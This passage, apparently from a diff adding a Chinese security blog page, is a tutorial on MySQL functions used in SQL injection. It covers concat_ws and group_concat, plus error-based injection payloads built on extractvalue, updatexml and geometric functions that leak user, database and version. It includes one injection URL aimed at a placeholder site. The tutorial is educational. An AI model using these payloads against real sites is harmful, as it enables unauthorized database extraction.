class="line">+---------------+</span><br><span class="line">| aa            |</span><br><span class="line">+---------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3, contcat_ws(separator,str1,str2,…)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt;  select concat_ws(&apos;,&apos;,&apos;11&apos;,&apos;22&apos;,&apos;33&apos;);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| concat_ws(&apos;,&apos;,&apos;11&apos;,&apos;22&apos;,&apos;33&apos;) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| 11,22,33                      |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  select concat_ws(&apos;11&apos;,&apos;22&apos;,&apos;33&apos;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| concat_ws(&apos;11&apos;,&apos;22&apos;,&apos;33&apos;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 221133                    |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  select concat_ws(&apos;11&apos;,&apos;22&apos;,null);</span><br><span class="line">+---------------------------+</span><br><span class="line">| concat_ws(&apos;11&apos;,&apos;22&apos;,null) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 22                        |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  select concat_ws(&quot;66&quot;,&apos;11&apos;,&apos;22&apos;,null);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| concat_ws(&quot;66&quot;,&apos;11&apos;,&apos;22&apos;,null) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 116622                         |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  select concat_ws(&quot;,&quot;,&apos;11&apos;,&apos;22&apos;,null);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| concat_ws(&quot;,&quot;,&apos;11&apos;,&apos;22&apos;,null) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| 11,22                         |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  select concat_ws(&quot;77&quot;,&quot;66&quot;,&apos;11&apos;,&apos;22&apos;,null);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| concat_ws(&quot;77&quot;,&quot;66&quot;,&apos;11&apos;,&apos;22&apos;,null) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| 6677117722                          |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  select concat_ws(&quot;77&quot;,&quot;66&quot;,&apos;11&apos;,&apos;22&apos;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| concat_ws(&quot;77&quot;,&quot;66&quot;,&apos;11&apos;,&apos;22&apos;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 6677117722                     |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>4,   group_concat(username)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select group_concat(username) from user;</span><br><span class="line">+------------------------+</span><br><span class="line">| group_concat(username) |</span><br><span class="line">+------------------------+</span><br><span class="line">| admin                  |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="六，sql报错注入函数"><a href="#六，sql报错注入函数" class="headerlink" title="六，sql报错注入函数"></a>六，sql报错注入函数</h2><p>1，<a href="https://www.duwentao.top/2019/01/16/05%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5floor%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">floor函数的报错注入</a></p>
+<p>2, <a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" target="_blank" rel="noopener">extractvalue()函数</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysql&gt; select extractvalue(3,concat(0x7e,(select user()),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;</span><br><span class="line">mysql&gt; select extractvalue(3,concat(0x7e,(select database()),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~test~&apos;</span><br></pre></td></tr></table></figure>
+
+<p>3，updatexml()</p>
+<p>在学习之前,需要先了解 UpdateXml() 。</p>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
+<p>然后咱们再看看语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>CONCAT(str1,str2,…)  </p>
+<p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
+<p>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p>
+<p>错误大概会是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;</span><br><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select version()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~8.0.12~&apos;</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">不懂Xpath格式的字符串的来这里</a></p>
+<p>4，geometrycollection()</p>
+<p>说明：在mysql 5.1.73   版本上执行成功，在5.7上执行失败，8.0.12版本执行失败，应该是弃用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from (select user() AS `user()`) `a`) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p>5， multipoint()</p>
+<p>说明：在mysql 5.1.73   版本上执行成功，在5.7上执行失败，8.0.12版本执行失败，应该是弃用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from (select user() AS `user()`) `a`) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>6,polygon()</p>
+<p>说明：在mysql 5.1.73   版本上执行成功，在5.7上执行失败，8.0.12版本执行失败，应该是弃用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select polygon((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from (select user() AS `user()`) `a`) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.1.73    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.12    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select polygon((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `a`.`user()` from ((select user() AS `user()`) `a`))&apos; value found during parsing</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>7,multipolygon()</p>
+<p>说明：在mysql 5.1.73   版本上执行成功，在5.7上执行失败，8.0.12版本执行失败，应该是弃用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from (select user() AS `user()`) `a`) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>8,linestring()</p>
+<p>说明：在mysql 5.1.73   版本上执行成功，在5.7上执行失败，8.0.12版本执行失败，应该是弃用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select  linestring((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from (select user() AS `user()`) `a`) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p>9,multilinestring()</p>
+<p>说明：在mysql 5.1.73   版本上执行成功，在5.7上执行失败，8.0.12版本执行失败，应该是弃用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from (select user() AS `user()`) `a`) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<h2 id="七，视频演示"><a href="#七，视频演示" class="headerlink" title="七，视频演示"></a>七，视频演示</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/nZ5wEPicfNA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/web安全/">web安全</a><a href="/tags/sql注入/">sql注入</a><a href="/tags/mysql/">mysql</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://blog.wangluomingong.top/2019/01/23/06,SQL注入字符串过滤总结/" data-title="06,sql注入专题之mysql常用绕过函数总结 | D&#39;Blog" data-tsina class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev">
+ <a href="/2019/01/26/07,SQL注入之asp加access数据库/" title="07，sql专题之asp加access数据的注入和加固">
+  <strong>上一篇：</strong><br>
+  <span>
+  07，sql专题之asp加access数据的注入和加固</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/01/16/05，sql注入专题之报错注入floor函数/" title="05，sql注入专题之sql盲注floor函数">
+ <strong>下一篇：</strong><br> 
+ <span>05，sql注入专题之sql盲注floor函数
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一，环境部署"><span class="toc-number">1.</span> <span class="toc-text">一，环境部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二，截断字符串函数"><span class="toc-number">2.</span> <span class="toc-text">二，截断字符串函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三，字符串转换函数"><span class="toc-number">3.</span> <span class="toc-text">三，字符串转换函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四，替换"><span class="toc-number">4.</span> <span class="toc-text">四，替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五，字符串连接函数"><span class="toc-number">5.</span> <span class="toc-text">五，字符串连接函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六，sql报错注入函数"><span class="toc-number">6.</span> <span class="toc-text">六，sql报错注入函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#七，视频演示"><span class="toc-number">7.</span> <span class="toc-text">七，视频演示</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/web安全/" title="web安全">web安全<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sql注入/" title="sql注入">sql注入<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mysql/" title="mysql">mysql<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/c/" title="c++">c++<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/自考/" title="自考">自考<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web-靶机/" title="web-靶机">web-靶机<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/数据结构/" title="数据结构">数据结构<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/靶机渗透/" title="靶机渗透">靶机渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/二进制安全/" title="二进制安全">二进制安全<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ssh/" title="ssh">ssh<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/内网渗透/" title="内网渗透">内网渗透<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web漏洞/" title="web漏洞">web漏洞<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ssrf/" title="ssrf">ssrf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/access/" title="access">access<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/靶机/" title="靶机">靶机<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/博客/" title="博客">博客<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://blog.51cto.com/tdcqvip" target="_blank" title="弃用博客地址">弃用博客地址</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA?view_as=subscriber" target="_blank" title="订阅频道">订阅频道</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://xj.hk/" target="_blank" title="导航网">导航网</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://y4er.com/" target="_blank" title="y4er">y4er</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://phpinfo.me" target="_blank" title="Lcy">Lcy</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://paper.seebug.org" target="_blank" title="seebug">seebug</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://hu3sky.ooo/" target="_blank" title="hu3sky">hu3sky</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://2kb.me/" target="_blank" title="每日必看-2kb">每日必看-2kb</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.52tech.tech/" target="_blank" title="每日必看-52tech">每日必看-52tech</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.52bug.cn/" target="_blank" title="每日必看-52bug">每日必看-52bug</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer">
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 欢迎来到我的博客 <br>
+			请在友情链接里订阅我的频道</p>
+	</section>
+	 
+	<div class="social-font">
+		
+		
+		<a href="https://github.com/heavenlyvip" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:duwentao.dwt@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
+		
+		<a href="/about" target="_blank" title="D">D</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
